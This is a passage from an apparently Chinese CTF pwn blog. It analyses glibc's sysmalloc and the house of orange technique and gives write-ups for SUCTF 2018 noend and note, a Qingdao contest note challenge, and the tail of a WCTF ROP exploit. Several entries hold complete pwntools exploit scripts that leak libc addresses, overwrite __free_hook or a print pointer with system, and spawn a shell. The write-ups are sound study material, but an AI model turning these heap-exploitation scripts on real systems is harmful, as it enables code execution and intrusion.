atoi_addr-libc.symbols['atoi']pr_addr = libc_base + 0x0000000000021102prsi_addr = libc_base + 0x0202e8ppr_addr = libc_base + 0x00000000001150c9buf = 0x602000+0xa00#ROPshellcode= '0gur1'.ljust(0x18,'x')shellcode+=p64(pr_addr)+p64(0)shellcode+=p64(ppr_addr)+p64(0x30)+p64(buf)shellcode+=p64(read_addr)shellcode+=p64(pr_addr)+p64(buf)shellcode+=p64(ppr_addr)+p64(0)+p64(0)shellcode+=p64(open_addr)shellcode+=p64(pr_addr)+p64(3)shellcode+=p64(ppr_addr)+p64(0x30)+p64(buf)shellcode+=p64(read_addr)shellcode+=p64(pr_addr)+p64(1)shellcode+=p64(ppr_addr)+p64(0x30)+p64(buf)shellcode+=p64(write_addr)p.recvuntil('&gt; ')p.sendline('1')p.sendline(shellcode)time.sleep(1)p.send('flag.txt')p.interactive() 参考链接：WCTF 2018 - binja - rswc]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sysmalloc源码分析]]></title>
    <url>%2F2018%2F07%2F10%2Fsysmalloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[之前在做SUCTF的note时接触到了house of orange的原理，即将top的大小修改为一个比较小的值，再分配一个比size大的值时，原来的top就会free并放入到unsorted bin里，重新产生一个新的top。而note这道题由于可以自己创造出unsorted bin，就没有修改top的大小。今天简单看了一下sysmalloc的源码，重新认识了house of orange。ps：在网上找了一些大佬讲原理的blog，发现各位大佬都分析的是非主分配区部分的源码，而实际上多数用到的是main arena的源码，虽然原理类似，但是金牛座就愿意钻牛角尖=。= 一个用来调试的栗子123456789101112131415#define fake_size 0x1fe1int main(void)&#123; void *ptr; ptr=malloc(0x10); ptr=(void *)((int)ptr+24); *((long long*)ptr)=fake_size; malloc(0x2000); malloc(0x60);&#125; 栗子参考了ctf-wiki，将top的大小改为了0x1fe1，然后再分配0x2000大小的chunk，由于_int_malloc的其他环节都不能处理了，由此调用sysmalloc sysmalloc的源码根据上面的栗子，在第二个malloc处对sysmalloc的源码逐步分析的 123456789101112131415161718192021222324252627282930313233343536373839static void *sysmalloc (INTERNAL_SIZE_T nb, mstate av)&#123; mchunkptr old_top; /* incoming value of av-&gt;top */ INTERNAL_SIZE_T old_size; /* its size */ char *old_end; /* its end address */ long size; /* arg to first MORECORE or mmap call */ char *brk; /* return value from MORECORE */ long correction; /* arg to 2nd MORECORE call */ char *snd_brk; /* 2nd return val */ INTERNAL_SIZE_T front_misalign; /* unusable bytes at front of new space */ INTERNAL_SIZE_T end_misalign; /* partial page left at end of new space */ char *aligned_brk; /* aligned offset into brk */ mchunkptr p; /* the allocated/returned chunk */ mchunkptr remainder; /* remainder from allocation */ unsigned long remainder_size; /* its size */ size_t pagesize = GLRO (dl_pagesize); bool tried_mmap = false; /* If have mmap, and the request size meets the mmap threshold, and the system supports mmap, and there are few enough currently allocated mmapped regions, try to directly map this request rather than expanding top. */ if (av == NULL || ((unsigned long) (nb) &gt;= (unsigned long) (mp_.mmap_threshold) &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max))) &#123; …… &#125; av是当前的分配区，mmap_threshold是能够使用mmap分配的阈值，n_mmaps_max是mmap分配的内存块设定的最大值，调试查看这两个值： 显然当前我们输入的0x2000不满足这个条件，执行下一个分支。 123456789101112131415161718old_top = av-&gt;top;old_size = chunksize (old_top);old_end = (char *) (chunk_at_offset (old_top, old_size));brk = snd_brk = (char *) (MORECORE_FAILURE);/* If not the first time through, we require old_size to be at least MINSIZE and to have prev_inuse set. */assert ((old_top == initial_top (av) &amp;&amp; old_size == 0) || ((unsigned long) (old_size) &gt;= MINSIZE &amp;&amp; prev_inuse (old_top) &amp;&amp; ((unsigned long) old_end &amp; (pagesize - 1)) == 0));/* Precondition: not enough current space to satisfy nb request */assert ((unsigned long) (old_size) &lt; (unsigned long) (nb + MINSIZE)); 接下来获取原来的top信息：起始地址、大小、终止地址。并且要求满足两个assert的条件： 第一次调用sysmalloc函数，top还没有初始化；或者已经初始化，top的大小大于MINSIZE（0x20），前一个chunk处于inuse状态，以及top chunk的结束地址是页对齐的。 原top的大小小于当前要分配chunk的大小。 1234567891011121314151617181920212223242526272829303132333435363738if (av != &amp;main_arena) &#123; …… &#125;else /* av == main_arena */ &#123; /* Request enough space for nb + pad + overhead */ size = nb + mp_.top_pad + MINSIZE; /* If contiguous, we can subtract out existing space that we hope to combine with new space. We add it back later only if we don't actually get contiguous space. */ if (contiguous (av)) size -= old_size; /* Round to a multiple of page size. If MORECORE is not contiguous, this ensures that we only call it with whole-page arguments. And if MORECORE is contiguous and this is not first time through, this preserves page-alignment of previous calls. Otherwise, we correct to page-align below. */ size = ALIGN_UP (size, pagesize); /* Don't try to call MORECORE if argument is so big as to appear negative. Note that since mmap takes size_t arg, it may succeed below even if we cannot call MORECORE. */ if (size &gt; 0) &#123; brk = (char *) (MORECORE (size)); LIBC_PROBE (memory_sbrk_more, 2, brk, size); &#125; 之后是判断av是主分配区还是配主分配区，大部分大佬分析的都是非主分配区这部分，我这里就主要看主分配区了。先是重新计算需要分配的size。然后判断当前分配区是否连续，并将size按照页对齐。当size&gt;0时，通过MORECORE（sbrk）分配连续的内存。 contiguous函数定义为： 12#define NONCONTIGUOUS_BIT (2U)#define contiguous(M) (((M)-&gt;flags &amp; NONCONTIGUOUS_BIT) == 0) 1234567891011if (brk != (char *) (MORECORE_FAILURE)) &#123; /* Call the `morecore' hook if necessary. */ void (*hook) (void) = atomic_forced_read (__after_morecore_hook); if (__builtin_expect (hook != NULL, 0)) (*hook)(); &#125; else &#123; …… &#125; 如果sbrk分配成功，并且MORECORE的hook函数存在，调用hook函数。（还不清楚hook用来干嘛） 12345678910111213141516171819if (brk != (char *) (MORECORE_FAILURE)) &#123; if (mp_.sbrk_base == 0) mp_.sbrk_base = brk; av-&gt;system_mem += size; /* If MORECORE extends previous space, we can likewise extend top size. */ if (brk == old_end &amp;&amp; snd_brk == (char *) (MORECORE_FAILURE)) set_head (old_top, (size + old_size) | PREV_INUSE); else if (contiguous (av) &amp;&amp; old_size &amp;&amp; brk &lt; old_end) &#123; /* Oops! Someone else killed our space.. Can't touch anything. */ malloc_printerr (3, "break adjusted to free malloc space", brk, av); &#125; 如果sbrk_base还没有初始化，就根据brk修改sbrk_base的值。更新当前分配区的内存分配总量。 如果新的brk和旧的top结尾是同一地址，也就是说新分配的内存与原top是挨着的，就直接更新原top头中的大小和PREV_INUSE位，相当于直接扩大了top。 如果brk小于原top结尾，则出错。 而对于house of orange，由于我们修改了top大小，top_end也提前了，此时分配的brk和top_end不是同一地址，而是从未修改前的top结尾开始分配的内存，即以上两个条件都不满足，从而进入到下面的这个分支。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657 else &#123; front_misalign = 0; end_misalign = 0; correction = 0; aligned_brk = brk; /* handle contiguous cases */ …… /* Adjust top based on results of second sbrk */ if (snd_brk != (char *) (MORECORE_FAILURE)) &#123; av-&gt;top = (mchunkptr) aligned_brk; set_head (av-&gt;top, (snd_brk - aligned_brk + correction) | PREV_INUSE); av-&gt;system_mem += correction; /* If not the first time through, we either have a gap due to foreign sbrk or a non-contiguous region. Insert a double fencepost at old_top to prevent consolidation with space we don't own. These fenceposts are artificial chunks that are marked as inuse and are in any case too small to use. We need two to make sizes and alignments work out. */ if (old_size != 0) &#123; /* Shrink old_top to insert fenceposts, keeping size a multiple of MALLOC_ALIGNMENT. We know there is at least enough space in old_top to do this. */ old_size = (old_size - 4 * SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK; set_head (old_top, old_size | PREV_INUSE); /* Note that the following assignments completely overwrite old_top when old_size was previously MINSIZE. This is intentional. We need the fencepost, even if old_top otherwise gets lost. */ chunk_at_offset (old_top, old_size)-&gt;size = (2 * SIZE_SZ) | PREV_INUSE; chunk_at_offset (old_top, old_size + 2 * SIZE_SZ)-&gt;size = (2 * SIZE_SZ) | PREV_INUSE; /* If possible, release the rest. */ if (old_size &gt;= MINSIZE) &#123; _int_free (av, old_top, 1); &#125; &#125; &#125; &#125; &#125;&#125; /* if (av != &amp;main_arena) */ 先有一些对齐操作，这里省略掉了，其中aligned_brk就是处理好之后的内存地址。 重新设置av-&gt;top的地址，为重新分配的aligned_brk，然后通过set_head设置top的大小和标志位，更新分配区的总分配内存量。 接着将top chunk切分为fenceposts和空闲块两部分，设置切分出空闲chunk大小为old_size。最终通过int_free释放掉old_top。 执行前后heap的大小比对： 以及top地址的变化： 第二个malloc执行结束后，unsortedbin中存放的即为原来的top地址]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[suctf2018-noend]]></title>
    <url>%2F2018%2F07%2F09%2Fsuctf2018-noend%2F</url>
    <content type="text"><![CDATA[基本逻辑 函数逻辑比较简单，用户输入size，程序就分配size大小的chunk，接着用户向新分配的chunk内写入内容，程序在终端显示。当size小于等于0x7f时，就释放该chunk。 漏洞分析乍一看，“咦，平时我们不都这么写吗”。实际上，在malloc之后要对返回值进行检查。如果malloc出错了，后续的操作很有可能超出我们的控制。 下面这个函数就是当调用malloc时执行的函数，它会首先获取一个分配区（arena_get），然后调用_int_malloc分配内存。 1234567891011121314151617181920212223242526272829303132void *__libc_malloc (size_t bytes)&#123; mstate ar_ptr; void *victim; void *(*hook) (size_t, const void *) = atomic_forced_read (__malloc_hook); if (__builtin_expect (hook != NULL, 0)) return (*hook)(bytes, RETURN_ADDRESS (0)); //获取分配区 arena_get (ar_ptr, bytes); //分配内存 victim = _int_malloc (ar_ptr, bytes); /* Retry with another arena only if we were able to find a usable arena before. */ //分配失败时，换到其他分配区内分配 if (!victim &amp;&amp; ar_ptr != NULL) &#123; LIBC_PROBE (memory_malloc_retry, 1, bytes); ar_ptr = arena_get_retry (ar_ptr, bytes); victim = _int_malloc (ar_ptr, bytes); &#125; if (ar_ptr != NULL) (void) mutex_unlock (&amp;ar_ptr-&gt;mutex); assert (!victim || chunk_is_mmapped (mem2chunk (victim)) || ar_ptr == arena_for_chunk (mem2chunk (victim))); return victim;&#125; 由于noend程序中对输入的大小没有做限制，如果尝试输入一个很大的值，该值大于mmap分配的内存块设定的最大值（n_mmaps_max）,malloc在使用_int_malloc分配内存时，由于从fast bins，last remainder，small bins，large bins和top chunk都分配失败时，会调用sysmalloc函数，下面是对sysmalloc的简化。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677if (av == NULL || ((unsigned long) (nb) &gt;= (unsigned long) (mp_.mmap_threshold) &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max))) &#123; //由于输入的值已经大于n_mmaps_max，不会进入此处执行 …… &#125;……if (av != &amp;main_arena) &#123; //考虑初始情况下都是在main_arena中进行分配，此处也不会执行 …… &#125; else /* av == main_arena */ &#123; /* Request enough space for nb + pad + overhead */ size = nb + mp_.top_pad + MINSIZE; if (contiguous (av)) size -= old_size; size = ALIGN_UP (size, pagesize); if (size &gt; 0) &#123; //sbrk（MORECORE）是通过将数据段的下界移动来分配连续内存，当size很大时，sbrk将会失败：MORECORE_FAILURE brk = (char *) (MORECORE (size)); LIBC_PROBE (memory_sbrk_more, 2, brk, size); &#125; if (brk != (char *) (MORECORE_FAILURE)) &#123; …… &#125; else &#123; if (contiguous (av)) size = ALIGN_UP (size + old_size, pagesize); if ((unsigned long) (size) &lt; (unsigned long) (MMAP_AS_MORECORE_SIZE)) size = MMAP_AS_MORECORE_SIZE; if ((unsigned long) (size) &gt; (unsigned long) (nb)) &#123; //使用MMAP分配size大小的连续内存 char *mbrk = (char *) (MMAP (0, size, PROT_READ | PROT_WRITE, 0)); if (mbrk != MAP_FAILED) &#123; …… &#125; &#125; &#125; if (brk != (char *) (MORECORE_FAILURE)) &#123; …… &#125; &#125; /* if (av != &amp;main_arena) */ …… /* finally, do the allocation */ p = av-&gt;top; size = chunksize (p); //当前top大小为size，与申请分配的大小nb+MINSIZE比较 /* check that one of the above allocation paths succeeded */ if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE)) &#123; …… &#125; /* catch all failure paths */ __set_errno (ENOMEM); return 0; 当试图申请一块巨大的内存时，sbrk和mmap都会失败，最终_int_malloc将会return 0。__libc_malloc对返回值进行判断，如果返回为0且分配区不为空时，就调用arena_get_retry重新获取一个新的分配区，并在新的分配区里分配内存。奇怪的是，如果此时_int_malloc又一次分配失败返回0，__libc_malloc也不会有其他操作了，直接返回0（assert是在debug模式下起作用的）。返回0之后，下面几句执行起来就会有问题： 123buf = malloc(size); read(0, buf, size); *((_BYTE *)buf + size - 1) = 0; 由于malloc返回了0，buf的值为0，read就是向0中写入内容，而*(buf+size-1)=0这一块，相当于向*(size-1)中写入0。 漏洞利用地址泄露在_init_free函数中，会对要释放的chunk的size做检查，检查发生在已经与前后块合并完成之后： 12345if ((unsigned long)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123; if (have_fastchunks(av))malloc_consolidate(av); ……&#125; 如果size大于设定的阈值，就会对fastbin进行合并（malloc_consolidate）。合并之后的块会放入到unsorted bin中（具体可以查看malloc_consolidate的源码），这时候将有机会利用unsorted bin泄露libc地址。 由于本题只对小于0x80的内存进行free，而且释放fastbin大小的块时是不会走到malloc_consolidate这一步的，所以可以通过malloc(0x7f)来触发malloc_consolidate：实际会分配0x90大小，属于small bin，释放的时候会与top合并，此时由于size大于阈值，由此触发fastbin合并操作。所以在0x7f之前再申请几块fastbin的内存。 注：fastbin的块即使在释放之后，P位也不会置0，在malloc_consolidate才会置0。 如果分别申请0x20和0x30，在合并之前它们分别呆在不同的fastbins里，然后执行malloc_consolidate： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556maxfb = &amp;fastbin (av, NFASTBINS - 1);fb = &amp;fastbin (av, 0);do &#123; p = atomic_exchange_acq (fb, 0); if (p != 0) &#123; do &#123; check_inuse_chunk(av, p); nextp = p-&gt;fd; size = p-&gt;size &amp; ~(PREV_INUSE|NON_MAIN_ARENA); //根据size找到下一块及大小 nextchunk = chunk_at_offset(p, size); nextsize = chunksize(nextchunk); //如果前一块是空闲块，合并 if (!prev_inuse(p)) &#123; prevsize = p-&gt;prev_size; size += prevsize; p = chunk_at_offset(p, -((long) prevsize)); unlink(av, p, bck, fwd); &#125; //下一块不是top if (nextchunk != av-&gt;top) &#123; nextinuse = inuse_bit_at_offset(nextchunk, nextsize); //下一块时空闲块，合并 if (!nextinuse) &#123; size += nextsize; unlink(av, nextchunk, bck, fwd); &#125; else//下一块不是空闲块，将下一块中记录本块是否空闲的P位置0 clear_inuse_bit_at_offset(nextchunk, 0); //将p放入到unsorted bin当中 first_unsorted = unsorted_bin-&gt;fd; unsorted_bin-&gt;fd = p; first_unsorted-&gt;bk = p; if (!in_smallbin_range (size)) &#123; p-&gt;fd_nextsize = NULL; p-&gt;bk_nextsize = NULL; &#125; set_head(p, size | PREV_INUSE); p-&gt;bk = unsorted_bin; p-&gt;fd = first_unsorted; set_foot(p, size); &#125; //下一块是top，合并 else &#123; size += nextsize; set_head(p, size | PREV_INUSE); av-&gt;top = p; &#125; &#125; while ( (p = nextp) != 0); &#125; &#125; while (fb++ != maxfb); &#125; 即0x20（实际0x30）的块先放入unsorted bin，此时它的fd和bk已经写好，然后0x30（实际0x40）的块先与0x20的块合并，然后又与后面的top合并，原来0x20的头变为top头。 此后再分配一块内存并写入前8字节，就能读取到原来0x20的bk指针了，由此泄露地址。 劫持执行流参考Ne0出题人大佬的wp，用到了一个神奇的方法：事先写好一个字段作为top的大小，值为：free_hook-top_addr + system_addr，然后再从top分出free_hook-top_addr （大概为这个值）大小，并添加一些偏移，使得分配之后的top头中size字段正好能落在free_hook上，即将system_addr写入到free_hook。 之前在主分配区泄露了libc的地址，同样，我们也能泄露切换之后的分配区的top地址，原因是泄露地址时bk记录的是unsorted bin的地址，也就是实际内容-0x10处，而这个位置恰好记录的是top地址。 上面提到的事先写好一个字段为top的大小，然后是要通过malloc的漏洞，向某处写一个0。这个某处就可以是top的地址处，这样能让top向前提升几个字节，提升后能使top的大小正好为free_hook-top_addr + system_addr，之后再次malloc就会从修改后的top处分配内存，完成将system的地址写入到free_hook中。这里需要对写入的内容加入一些偏移，使得top的size字段对应于free_hook。 利用脚本123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354from pwn import *import timecontext.log_level='debug'p=process('./noend')libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')def routine(size,content): p.sendline(str(size)) time.sleep(0.3) p.send(content) p.recvuntil(content)routine(0x20,'0gur0')#0routine(0x30,'0gur1')#1routine(0x7f,'0gur2')#2routine(0x20,'0'*8)#泄露地址data = u64(p.recv()[:8])offset = 0x7f7c2d6dbb78-0x7f7c2d317000libc_base = data -offsetsys_addr = libc_base + libc.symbols['system']log.info('sys_addr:%#x '%sys_addr)#发送一个很大的size，从而切换到非主分配区p.sendline(str(libc_base+libc.symbols['__malloc_hook']))time.sleep(0.3)p.sendline()p.recvline()p.clean()#泄露非主分配区记录的top地址routine(0x20,'0gur0')#0routine(0x30,'0gur1')#1routine(0x7f,'0gur2')#2routine(0x20,'0'*8)new_top = u64(p.recv()[:8])log.info('new_top:%#x '%new_top)#其中new_top+0x868对应于top的地址，注意new_top是记录这个值的地址#+0x20是在top提升之后对应的地址#-0x8是考虑到malloc时会向16对齐的问题routine(0xf0,p64(sys_addr+libc_base+libc.symbols['__free_hook']-(new_top+0x868+0x20)-0x8)*(0xf0/8))p.sendline(str(new_top+1))time.sleep(0.3)p.sendline()p.recvline()p.clean()#设libc_base+libc.symbols['__free_hook']-(new_top+0x868+0x20)为offset，即当前top与free_hook之间的偏移为offset#则上一步将top的size写成offset-8+sys_addr，此处分配了offset-16的大小#在调试时查看到offset是以8结尾的，则malloc（offset-16），会进行（offset-16+8)对16向上取整，即实际分配offset-8大小的内存，则top的size恰好就变为sys_addr，而分配了offset-8之后，top地址正好挪到了free_hook-8处，则size正好写在了free_hook处routine(libc_base+libc.symbols['__free_hook']-(new_top+0x868+0x20)-0x10,'a'*8)routine(0x10,'/bin/sh')p.interactive()]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[青岛链湾杯--note]]></title>
    <url>%2F2018%2F06%2F27%2F%E9%9D%92%E5%B2%9B%E9%93%BE%E6%B9%BE%E6%9D%AF-note%2F</url>
    <content type="text"><![CDATA[废话：第一次打线下赛，确实很慌，该想到的东西都忘了，果然还是得多加练习啊QWQ 基本逻辑菜单类小游戏：add，edit，show，delete，copy add：添加结点，此处能够了解结点的结构 edit函数对结点的content进行编辑，但是这里的v3，v4，v1都没有进行初始化或者置零，将是本题的关键。 show函数，展示结点的content以及title。这个print函数是写在bss段的一个地址，通过调试发现写入的就是puts函数地址。 copy函数，malloc出某结点size大小的块N次，N为用户输入。 漏洞利用所有结点的地址以数组元素的形式存在于bss段中的s1[]中。前面已经说到了，在edit函数里，对存放size，content地址和结点地址的变量v1，v4和v3都没有进行初始化。发现这个问题的契机在于，当第二次edit某个结点content时，随意输入title都会提示“plz input new content”。没有初始化的后果就是，由于这些函数都会共用一块栈空间，比如show中的v3和edit中的v3地址都是ebp-0x120，v4都是ebp-0x118，导致当在show之后，v3和v4的值为刚刚操作过的结点的地址和content地址，而进入到edit函数中后即使输入的title没有匹配，也会执行向v4中写入v1个字节的操作，如果v4和v1不是同一结点的两个参数，那么就会导致溢出。 例如：v1为s1[1]中的size，而v3和v4是s1[0]中的参数，edit就会向v4中写入v1个字节，当v1大于s1[0]的size时，会造成溢出。溢出后就可以修改s1[0]中content的地址，之后再edit时就相当于相被修改的地址中写入内容。这里先把content0地址修改为print的地址，edit时向print的位置写入system@plt，再次show的时候就相当于执行system。 利用脚本123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263from pwn import *context.log_level='debug'p=process('./note')def add(size,content,title): p.recvuntil('input choice:\n') p.sendline('1') p.recvuntil('input content size\n') p.sendline(str(size)) p.recvuntil('input content\n') p.sendline(content) p.recvuntil('input note title\n') p.sendline(title)def edit(title,content): p.recvuntil('input choice:\n') p.sendline('2') p.recvuntil('plz input title\n') p.sendline(title) p.recvuntil('plz input new content\n') p.sendline(content)def show(title): p.recvuntil('input choice:\n') p.sendline('3') p.recvuntil('plz input title\n') p.sendline(title)def copy(title,num): p.recvuntil('input choice:\n') p.sendline('5') p.recvuntil('plz input title\n') p.sendline(title) p.recvuntil('how many times do you want\n') p.sendline(str(num))p.recvuntil('plz input your name\n')p.sendline('')print_addr = 0x602100sys_plt = 0x400860#0add(128,"0gur0","0")#1add(256,"0gur1","1")#2add(256,"/bin/sh","/bin/sh")#edit 1 v1=256edit("1","new 0gur1")#show 0 v3=s[0] v4=s[0].contentshow("0")#edit content0's addrpayload ='a'*128#content0payload +=p64(0)+p64(0x35) #node0 chunk headerpayload+=p64(48)+p64(0)+p64(128)+p64(print_addr) #node0edit("hhh",payload)#edit 0edit("0",p64(sys_plt))#show:print-&gt;systemshow('/bin/sh')p.interactive() PS：一个还没有解决的问题，malloc按理说应该是在堆上进行分配的，但是本题查看分配的地址，都是以0x7f开头的，比较像栈上的地址，而且即使分配了多个块，top chunk的大小都不变…]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[suctf2018-note]]></title>
    <url>%2F2018%2F06%2F05%2Fsuctf2018-note%2F</url>
    <content type="text"><![CDATA[house of orange – note基础知识 unsorted bin的解链操作没有类似于malloc中p-&gt;fd-&gt;bk == p的检查 small bins和fastbin存在内存大小相等的区域，例如32位操作系统，fastbin的chunk为64字节以下的16，24,32……；同时，small bins的大小也是从16开始依次相差8字节的chunk大小。但是两者不在同一个位置，fastbin有自己的位置，small bins位于bins数组中。当释放的内存在64B以下时，会直接放入fastbin中；unsorted bin中的chunk最终会放入到small bins中。 house of orange(堆地址未知的情况) 这里省去了修改top大小的部分，修改top大小是为了重新分配一个top，把旧top放入到unsorted bin中，以利用unsorted bin的各种攻击。适用于没有unsorted bin的情况下，如果程序中有unsorted bin，可以省略这部分。 house of orange的原理是，调用malloc时，利用unsorted bin中错误的FD/BK指针，触发malloc_printerr函数打印错误信息，malloc_printerr调用__libc_message，_libc_message调用abort()，abort()调用_IO_flush_all_lockp。在_IO_flush_all_lockp中，通过对链表结构_IO_list_all中的每个结点进行遍历，找到符合条件的结点，执行_IO_OVERWRITE函数，其中结点是_IO_FILE_PLUS类型的结构体，对函数的查找需要通过vtable定位函数表。 通过代码来具体查看，malloc_printerr用于打印错误信息，位于malloc.c中： 1234567891011121314151617181920212223242526static voidmalloc_printerr (int action, const char *str, void *ptr, mstate ar_ptr)&#123; /* Avoid using this arena in future. We do not attempt to synchronize this with anything else because we minimally want to ensure that __libc_message gets its resources safely without stumbling on the current corruption. */ if (ar_ptr) set_arena_corrupt (ar_ptr); if ((action &amp; 5) == 5) __libc_message (action &amp; 2, "%s\n", str); else if (action &amp; 1) &#123; char buf[2 * sizeof (uintptr_t) + 1]; buf[sizeof (buf) - 1] = '\0'; char *cp = _itoa_word ((uintptr_t) ptr, &amp;buf[sizeof (buf) - 1], 16, 0); while (cp &gt; buf) *--cp = '0'; __libc_message (action &amp; 2, "*** Error in `%s': %s: 0x%s ***\n", __libc_argv[0] ? : "&lt;unknown&gt;", str, cp); &#125; else if (action &amp; 2) abort ();&#125; ​ 在__libc_message中会调用absort（）： 123456789101112131415161718192021/* Abort with an error message. */void__libc_message (int do_abort, const char *fmt, ...)&#123; va_list ap; int fd = -1; va_start (ap, fmt); …… va_end (ap); if (do_abort) &#123; BEFORE_ABORT (do_abort, written, fd); /* Kill the application. */ abort (); &#125;&#125; abort()中调用_IO_flush_all_lockp()，在调用之前先define为fflush： 12345678910111213141516171819202122232425262728293031323334#define fflush(s) _IO_flush_all_lockp (0) ……voidabort (void)&#123; struct sigaction act; sigset_t sigs; /* First acquire the lock. */ __libc_lock_lock_recursive (lock); /* Now it's for sure we are alone. But recursive calls are possible. */ /* Unlock SIGABRT. */ if (stage == 0) &#123; ++stage; if (__sigemptyset (&amp;sigs) == 0 &amp;&amp; __sigaddset (&amp;sigs, SIGABRT) == 0) __sigprocmask (SIG_UNBLOCK, &amp;sigs, (sigset_t *) NULL); &#125; /* Flush all streams. We cannot close them now because the user might have registered a handler for SIGABRT. */ if (stage == 1) &#123; ++stage; //_IO_flush_all_lockp() fflush (NULL); &#125; ……&#125; 离底层越来越近了…… _IO_flush_all_lockp()获取了_IO_list_all链表，对每一个结点进行处理： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556int_IO_flush_all_lockp (int do_lock)&#123; int result = 0; struct _IO_FILE *fp; int last_stamp;#ifdef _IO_MTSAFE_IO __libc_cleanup_region_start (do_lock, flush_cleanup, NULL); if (do_lock) _IO_lock_lock (list_all_lock);#endif last_stamp = _IO_list_all_stamp; //获取_IO_list_all fp = (_IO_FILE *) _IO_list_all; while (fp != NULL) &#123; run_fp = fp; if (do_lock) _IO_flockfile (fp); //先对_IO_FILE中的mode,_IO_write,_IO_write_base等检查，满足条件才执行_IO_OVERFLOW if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T || (_IO_vtable_offset (fp) == 0 &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base))#endif ) &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF) result = EOF; if (do_lock) _IO_funlockfile (fp); run_fp = NULL; if (last_stamp != _IO_list_all_stamp) &#123; /* Something was added to the list. Start all over again. */ fp = (_IO_FILE *) _IO_list_all; last_stamp = _IO_list_all_stamp; &#125; else //循环是通过每个结点的chain字段 fp = fp-&gt;_chain; &#125;#ifdef _IO_MTSAFE_IO if (do_lock) _IO_lock_unlock (list_all_lock); __libc_cleanup_region_end (0);#endif return result;&#125; 其中，确定_IO_list_all中结点的结构体为_IO_FILE_plus: _IO_FILE_plus的结构，即一个_IO_FILE结构和一个虚表指针vtable： 12345struct _IO_FILE_plus&#123; _IO_FILE file; const struct _IO_jump_t *vtable;&#125;; _IO_FILE结构如下，其中chain是用于记录下一结点的位置的： 继续看_IO_flush_all_lockp，在if处对结点中各字段进行检查，当满足条件时，会执行_IO_OVERFLOW，函数的寻址是通过查寻vtable实现的。vtable的结构如下，第四行即为_IO_OVERFLOW的地址： 12345678910111213141516171819202122232425struct _IO_jump_t289 &#123;290 JUMP_FIELD(size_t, __dummy);291 JUMP_FIELD(size_t, __dummy2);292 JUMP_FIELD(_IO_finish_t, __finish);293 JUMP_FIELD(_IO_overflow_t, __overflow);294 JUMP_FIELD(_IO_underflow_t, __underflow);295 JUMP_FIELD(_IO_underflow_t, __uflow);296 JUMP_FIELD(_IO_pbackfail_t, __pbackfail);297 /* showmany */298 JUMP_FIELD(_IO_xsputn_t, __xsputn);299 JUMP_FIELD(_IO_xsgetn_t, __xsgetn);300 JUMP_FIELD(_IO_seekoff_t, __seekoff);301 JUMP_FIELD(_IO_seekpos_t, __seekpos);302 JUMP_FIELD(_IO_setbuf_t, __setbuf);303 JUMP_FIELD(_IO_sync_t, __sync);304 JUMP_FIELD(_IO_doallocate_t, __doallocate);305 JUMP_FIELD(_IO_read_t, __read);306 JUMP_FIELD(_IO_write_t, __write);307 JUMP_FIELD(_IO_seek_t, __seek);308 JUMP_FIELD(_IO_close_t, __close);309 JUMP_FIELD(_IO_stat_t, __stat);310 JUMP_FIELD(_IO_showmanyc_t, __showmanyc);311 JUMP_FIELD(_IO_imbue_t, __imbue);312 &#125;; 按照simp1e大佬的说法，2.24版本的glibc在执行_IO_OVERFLOW之前还有一个对vtable的检查函数：_IO_check_vtable，他的思路是利用已有的vtable而不是我们自己伪造的vtable，这样很容易过check。实际上也确实有这样的vtable结构：_IO_str_jumps，它就是vtable类型的结构体，因此_IO_OVERFLOW的位置对应于_IO_str_overflow（第三行） 1234567891011121314151617181920212223const struct _IO_jump_t _IO_str_jumps libio_vtable =356 &#123;357 JUMP_INIT_DUMMY,358 JUMP_INIT(finish, _IO_str_finish),359 JUMP_INIT(overflow, _IO_str_overflow),360 JUMP_INIT(underflow, _IO_str_underflow),361 JUMP_INIT(uflow, _IO_default_uflow),362 JUMP_INIT(pbackfail, _IO_str_pbackfail),363 JUMP_INIT(xsputn, _IO_default_xsputn),364 JUMP_INIT(xsgetn, _IO_default_xsgetn),365 JUMP_INIT(seekoff, _IO_str_seekoff),366 JUMP_INIT(seekpos, _IO_default_seekpos),367 JUMP_INIT(setbuf, _IO_default_setbuf),368 JUMP_INIT(sync, _IO_default_sync),369 JUMP_INIT(doallocate, _IO_default_doallocate),370 JUMP_INIT(read, _IO_default_read),371 JUMP_INIT(write, _IO_default_write),372 JUMP_INIT(seek, _IO_default_seek),373 JUMP_INIT(close, _IO_default_close),374 JUMP_INIT(stat, _IO_default_stat),375 JUMP_INIT(showmanyc, _IO_default_showmanyc),376 JUMP_INIT(imbue, _IO_default_imbue)377 &#125;; 如果我们能够控制_IO_str_overflow的地址，就能执行system函数了。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859_IO_str_overflow (FILE *fp, int c)82 &#123;83 int flush_only = c == EOF;84 size_t pos;85 if (fp-&gt;_flags &amp; _IO_NO_WRITES)86 return flush_only ? 0 : EOF;87 if ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))88 